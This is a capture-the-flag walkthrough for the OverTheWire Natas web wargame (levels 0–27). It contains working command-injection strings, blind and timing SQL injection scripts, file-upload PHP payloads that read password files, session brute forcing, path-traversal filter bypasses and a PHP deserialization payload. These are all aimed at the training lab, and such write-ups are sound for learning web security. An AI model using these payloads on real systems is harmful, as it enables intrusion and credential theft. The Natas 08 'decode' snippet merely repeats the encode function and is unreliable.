# Capture the Flag

### [Install]
All the challenges can be accessed with the browser at the following website. You will find the passwords along the way: \
`http://natasX.natas.labs.overthewire.org` \ \
All the flags are in `/etc/natas_webpass/`, so those are the files we should aim to read in each level. Obviously, we need to gain the right permissions first. \
For this challenges, installing the BurpSuite proxy is a really good idea. 

### [Natas 00]
`http://natas0.natas.labs.overthewire.org` \
User:Password: natas0:natas0

Just look at the source of the page... Right click or Ctrl+u, if you want the shortcut.

### [Natas 01]
`http://natas1.natas.labs.overthewire.org` \
Just look at the source of the page... No right click, so Ctrl+u is the way to go.

### [Natas 02]
`http://natas2.natas.labs.overthewire.org` \
The source of the page doesn't contain the flag, but it shows that there is an image stored under `/files`. \
We can access the `/files folder` just by putting the path in the url: `http://natas2.natas.labs.overthewire.org/files` \
From here, we see that there is a users.txt file, and accessing it gives the flag: `http://natas2.natas.labs.overthewire.org/files/users.txt`

### [Natas 03]
`http://natas3.natas.labs.overthewire.org` \
The source of the page doesn't contain the flag, but has a hint: Google is not allowed to find the solution. This points us to the `robots.txt file`: in this file are listed the folders that crawlers are allowed or not allowed to visit. \
So in `http://natas3.natas.labs.overthewire.org/robots.txt` we discover a folder called `/s3cr3t`, and visiting it reveals again a users.txt file with the flag at `http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt`.

### [Natas 04]
`http://natas4.natas.labs.overthewire.org` \
The page complains about where your request is coming from. This is a parameter that HTTP requests hold in the header, and to change it we have to intercept the request with the proxy. \
After starting Burp and setting up the proxy, we deactivate interception and load the page a couple of times. On refreshing, the page will tell you where you came from. \
It's time to activate the Burp interception and refresh once again: the request will be trapped, and we can move it to the repeater. There we modify the referer so that it corresponds to the one the pages wishes: `http://natas5.natas.labs.overthewire.org`. \
Send the modified request, and enjoy the flag.

### [Natas 05]
`http://natas5.natas.labs.overthewire.org` \
This time the page complains that you are not logged in. If we intercept the page with Burp, we see that one of the cookie parameters is 'loggedin' and is set to 0. \ If we move the request to the repeater, modify that value to 1 and send it again, we will get the flag.

### [Natas 06]
`http://natas6.natas.labs.overthewire.org` \
No need of proxy for this one, looking at the provided link with the php source is enough: we can't find out the secret directly because it is hidden by a variable name, but we see that that variable is defined in `/includes/secret.inc`. 
We visit the page `http://natas6.natas.labs.overthewire.org/includes/secret.inc` and look at the source, and there is our secret. \
We can now submit it in the challenge page and get the flag.

### [Natas 07]
`http://natas7.natas.labs.overthewire.org` \
Not much to see, but the source tells us that our target should be the password file in `/etc/natas_webpass/natas8`. \
After clicking on home and about, we see that the target page is passed as GET parameter. We just have to do the same with our file: `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`

### [Natas 08]
`http://natas8.natas.labs.overthewire.org` \
Similarly to challenge 06, we have to pass a secret to get the key. However, this time the secret is directly in the source file, in an encrypted form. \
Luckily, we also have the encrypting method, and we can reverse it: 
```c
encode($secret) {return bin2hex(strrev(base64_encode($secret)));} 
decode($secret) {return bin2hex(strrev(base64_encode($secret)));}
```
You can execute the code online with a service like PHP Sandbox

### [Natas 09]
`http://natas9.natas.labs.overthewire.org` \
Looking at the source of this challenge, we can see that PHP lovely executes whatever we pass as input using the command `passthru`.\
We just have to give it something to grep and append a command to our password file to have it printed out.\
Our search string will be: `adsfasdf dictionary.txt; cat /etc/natas_webpass/natas10;`

### [Natas 10]
`http://natas10.natas.labs.overthewire.org` \
The challenge is exactly the same as level 9, but some special characters are blacklisted.\
URL encoding the search string is not enough, so we have to trick the command in another way. \
What we can do is tell grep to use the -e option to look for a pattern we know exists in our own target file, and not care about what happens with the dictionary: `-e '' /etc/natas_webpass/natas11`

### [Natas 11]
`http://natas11.natas.labs.overthewire.org` \
This challenge requires a bit of manual work to find out how to encrypt the cookie. We know that the encryption is XOR based, meaning that if we have cleartext and cryptotext we can retrieve the key by xoring them together. \
We obtain the encryption algorithm `xor_encrypt` and the cleartext `$defaultdata` from the source code. \
We get the cryptotext by intercepting a request with burp and extracting the data from the cookie. \
Remember to first `base64_decrypt` the cookie content and to echo it in hex using for example `bin2hex`. \
After this we can start xoring each character of the clear and crypto texts to get the key characters. After 4 chars it starts repeating, so we know that we have the key. \
We can now plug the key into the encryption algorithm, modify the default cookie so that `showpassword` is yes, and run the script to get the newly encoded cookie. With it, we can resend the request and get the flag.

### [Natas 12]
`http://natas12.natas.labs.overthewire.org` \
So the upload system takes our file, puts it somewhere without much of a check about what it is, and gives us back a link. \
First idea is to directly upload a php file that echoes back the password file. However, the file is saved in a jpg format and therefore not interpreted. \
Luckily, the format can be changed client side: with the developer tools in the browser we can look for the form input tags and set the file extension form jpg to php, and now clicking on the link will give back the flag.

```php
<?php
$homepage = file_get_contents('/etc/natas_webpass/natas13');
echo $homepage;
?>
```

### [Natas 13]
`http://natas13.natas.labs.overthewire.org` \
The first part of this challenge is exactly the same as before: create the php file, modify the form input field and profit. \
However, before profiting there is one additional step: the source code actually checks that we are really uploading a jpg file. \
To convince the server that we are playing fair, we can mask our php file as a jpg using magic numbers: these are numbers that are usually at the start of a file and identify its type. For jpg, the value is 0xFFD8FFDB. \
It is enough to open our php file with a hex editor and literally prepend it with these bytes to be able to upload it without problems.

```php
<?php
$homepage = file_get_contents('/etc/natas_webpass/natas14');
echo $homepage;
?>
```

### [Natas 14]
`http://natas14.natas.labs.overthewire.org` \
Looking at the source code, this challenge is a clear SQL injection. \
We know that the query is 
```sql
$query = "SELECT * 
        from users 
        where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```
We want to inject in the username so that the select will return content even if we don't know the username and password. \
What we have to do is close the user string with the quotes and put an OR clause that is always true; and then just comment out all the rest. \
To note is that a comment can also be a double dash (--), but in that case it needs a space just afterwards to work properly. \
This is the string that we use: `XXX" or "1"="1"; #`

### [Natas 15]
`http://natas15.natas.labs.overthewire.org` \
This challenge is a trickier version of SQL injection, because it is blind. This means that to get the information that we need we have to extrapolate it from other data. \
In this case, we have to build the password char by char, using a query `like natas16" and password like binary 'x%'`.\
We know that the 'password' column exists thanks to the comment in the source code, and with the 'LIKE' command we will get an answer only when the letters are correct (the % is a regex for 'doesn't matter what follows'). \
We will use the Intruder from Burp, and start a sniper attack where we use our query with x as all the letters of the alphabet, both small and capital (we can distinguish thanks to the BINARY instruction), and numbers. \
To identify the proper letter we check the length of the response. When we know the first letter, we move on changing the query as in `natas16" and password like 'Ax%'`. We will have to repeat this 32 times to get the entire flag: a python script comes in handy. The authorization and the other data comes from a request intercepted with Burp, copied as curl and translated to python by a service like cURL to Python

```python
import requests

letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==',
}

pwd = ''
for i in range(0,32):
    for l in letters:
        data = 'username=natas16" and password like binary "' + pwd + l + '%"; #'
        response = requests.post('http://natas15.natas.labs.overthewire.org', headers=headers, data=data)
        if 'exists' in response.text:
            pwd += l
            continue

print(pwd)
```

### [Natas 16]
`http://natas16.natas.labs.overthewire.org` \
We look back at challenges 09 and 10, but this time we are even more restricted in the characters that we are allowed to use. Interestingly, the dollar character is not filtered, and this allows us to executed some commands. What we will do is similar to the last challenge: a blind grep. \
We first look for a string that only returns one word, like 'doomed'. And then we append a grep command that will check if the password starts with the letter(s) that we are looking up in that iteration. If the letter sequence is right, than the result of the search will be empty; if the letter sequence is wrong, then we will be returned 'doomed'.

```python
import requests

letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==',
}

pwd = ''
for i in range(0,32):
    for l in letters:

        params = (
            ('needle', 'doomed$(grep ^' + pwd + l + ' /etc/natas_webpass/natas17)'),
            ('submit', 'Search'),
        )

        response = requests.get('http://natas16.natas.labs.overthewire.org/index.php', headers=headers, params=params)
        if 'doomed' not in response.text:
            pwd += l
            continue

print(pwd)
```

### [Natas 17]
`http://natas17.natas.labs.overthewire.org` \
Yet again a blind SQL injection. Main problem is, that we don't have any output helping us detecting whether our guess is right or wrong. Instead, we can use timing: if our guess is right, wait 1 seconds before answering. \
To achieve this behavior, we can use the following query: `username=natas18" and password like binary "' + pwd + l + '%" and sleep(1); #`. \
Thanks to lazy execution (as soon as the value is known the evaluation stops, meaning that as soon as a clause of an AND is false the evaluation stops) the query will sleep only if our guess is right.

```python
import requests
import time

letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==',
}

pwd = ''
for i in range(0,32):
    for l in letters:
        data = 'username=natas18" and password like binary "' + pwd + l + '%" and sleep(1); #'
        start_time = time.time()
        response = requests.post('http://natas17.natas.labs.overthewire.org', headers=headers, data=data)
        elapsed_time = time.time() - start_time
        if elapsed_time > 1:
            pwd += l
            continue

print(pwd)
```

### [Natas 18]
`http://natas18.natas.labs.overthewire.org` \
The trick is that the username and password do not matter! The authentication assigns you a session ID, and that is what is checked on the backend. \
We can see in the source code that the pool of IDs is just up to 640, and therefore we can bruteforce them. \
We intercept the request with Burp, translate it to python and go through all the possible values for the cookie, until we find one that tells us we are admin.

```python
import requests

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Authorization': 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==',
    }

data = 'username=admin&password=xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

for i in range(1,641):
    cookies = {
    'PHPSESSID': str(i),
    }

    response = requests.post('http://natas18.natas.labs.overthewire.org/index.php', headers=headers, cookies=cookies, data=data)

    if 'regular user' not in response.text:
        print(response.text)
        exit()
```

### [Natas 19]
`http://natas19.natas.labs.overthewire.org` \
The trick is the same as the last challenge, but this time we can't take a look at the code and the session ID isn't just a number anymore. \
After inspecting a few requests with burp, it seems that the new id has the following structure: number-givenUsername. \
This can be seen by taking the cookie value and decoding it as ASCII hex. \
Assuming that the numbers are still up to 640, we want to try all of them with the admin username. The trickier part is to tell python to encode everything in hex.

```python
import requests
import codecs

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==',
    }

data = 'username=admin&password=xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

for i in range(1,641):
    session = codecs.encode(bytes(str(i) + '-admin', 'utf-8'),'hex')
    cookies = {
    'PHPSESSID': session.decode("utf-8")
    }

    response = requests.post('http://natas19.natas.labs.overthewire.org/index.php', headers=headers, cookies=cookies, data=data)

    if 'regular' not in response.text:
        print(response.text)
        exit()
```

### [Natas 20]
`http://natas20.natas.labs.overthewire.org` \
This challenge was tricky to understand, because it mixes the concept of PHP sessions and of serialization. \
What happens is that the read and write methods are invoked automagically to handle the sessions, binding usernames to session ids. \
In particular, the name and id are stored as a 'key value' pair, one per line, and read from there to get the id which will be checked against the admin. We know that we need username 'admin' to have id '1' to get authorized. We can actually inject that as a new line when asking for the new name. \
First, we need to intercept the request with Burp, and to change the value of the name paramenter to `%0Aadmin%201`. This is the URL encoding of `\nadmin 1`. \
With this request we write 'admin 1' as a new line in the session file. We can then go back to the website and issue a new request for the name 'admin', and given that we are in the list, we will get the flag back.

### [Natas 21]
`http://natas21.natas.labs.overthewire.org` \
The website being in colocation means that there will be some resources shared between our target website and the other one that we are provided with, because the concept of colocation is hosting multiple websites on a single server. \
From the source code we see that the only thing checked for authorization is that the 'admin' key has value '1'. And this is a value that we can add from the colocated page: intercepting an update request with Burp we just have to add the field in the POST body. \
Make sure to use the session ID from a previous intercepted request coming from the main page. After submitting the POST, refreshing the main page should be enough to be authorized to see the flag.

### [Natas 22]
`http://natas22.natas.labs.overthewire.org` \
After reading the source code, the only trick to understand is that there is a quick redirect happening. Burp comes in handy to capture what is loaded before the redirect. \
In the source code it's clear that the password can be seen by adding the `revelio` parameter to the get request. \
This is the URL that we need to visit: `http://natas22.natas.labs.overthewire.org/?revelio`. \
Make sure to have Burp running, and switch to it to see the flag in the revelio page, that will be logged just before the redirect.

### [Natas 23]
`http://natas23.natas.labs.overthewire.org` \
The password has to satisfy two conditions: contain 'iloveyou' and start with a number larger than 10. \
The `strstr` method is basically looking for the index of the given substring. The integer comparison implies a cast from string to int, and it works as follows (from the PHP manual): 
> when a string is evaluated in a numeric context, the string is interpreted as a float if it contains any of the characters '.', 'e', or 'E'. 
> Otherwise, it will be evaluated as an integer. 
> The value is given by the initial portion of the string: if it starts with valid numeric data, this will be the value used. Otherwise, the value will be 0 (zero).
Our password can therefore be something like '15iloveyou'.

### [Natas 24]
`http://natas24.natas.labs.overthewire.org` \
This time the password is checked using `strcmp`. This method returns < 0 if str1 is less than str2; > 0 if str1 is greater than str2, and 0 if they are equal. The interesting part is that apparently it returns 0 also if the comparison generates an error! \
This means that our password has to be a value that will break the comparison, for example an array: we intercept the password request with Burp, and modify `/?passwd=a` to `/?passwd[]=a`. \
Trying to `strcmp` an array with a string will cause an error and we will get the flag.

### [Natas 25]
`http://natas25.natas.labs.overthewire.org` \
This challenge requires some path traversal and injecting into a file. \
Our target is the log file, from which we know the path: we have to move up a few folders until the root, and then go into `/logs`. For the name of the file itself we grap the session ID by intercepting a request with Burp. \
There is a protection for path traversal in place, which just substitutes `../`. What we do is adding characters to our ``../`, so that it will be in the right form after the sanitization: `../` becomes `.../...//`. \
We know that the UserAgent in the HTTP header request will be stored in the log file without sanitization: this means that we can access the password file from there, and then have it printed in the log. \
We intercept a request with Burp and modify it as follows: `GET: /?lang=.../...//logs/natas25_pl5gojum2i30fpacidq0h950q6.log HTTP/1.1`

### [Natas 26]
`http://natas26.natas.labs.overthewire.org` \

Thanks to n0j for the [writeup](https://n0j.github.io/2017/07/19/otw-natas-26.html), that helped a lot!\

There are three interesting things in this challenge: there is serialization ongoing, there is a logging class that has the methods used after serialization, and we have access to the serialized data stored in the cookie. \
Although the cookie is expected to contain only the data for the drawings, upon deserialization whatever is contained in the cookie will be run through the constructors and destructors methods. So we can create a logger object so that on destruction our target file will be dumped into something that we can access. The following code is from n0j's page:
```php
<?php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __construct(){
        $this->initMsg="blabla\n";
        $this->exitMsg="\n";
        $this->logFile = "/var/www/natas/natas26/img/pwd.php";
    }
}

$o = new Logger();
print base64_encode(serialize($o))."\n";
?>
```
This gives us the content of the cookie. We now have to intercept a request, change the cookie with our own content (make sure special characters are URL encoded), forward it and then visit our target page 'img/pwd.php'

### [Natas 27]
`http://natas27.natas.labs.overthewire.org` \
Thanks again to n0j for the [SQL insights](https://n0j.github.io/2017/07/20/otw-natas-27.html).

The main thing to realize in this challenge is that there is no requirements for the usernames in the database to be unique. What gives it away is that the dumpData method uses a loop, instead of just printing what should be a single object. \
The problem is, how do we register a second natas28 user? As n0j discovered, when trying to create a username longer than the allowed varchar64, the trailing part is just chopped. Even more interestingly, whitespaces are stored but are not considered when doing a SELECT query over the usernames. \
Therefore, registering a user with name `natas28 1` with empty password will succeed, and upon login with `natas28` and empty password we will be allowed in and showed the data of the first existing natas28 with the proper flag.

...Crypto? And then probably Perl? And then who knows what? No idea, really no clue. Sadly the ride along Natas stops here for me.
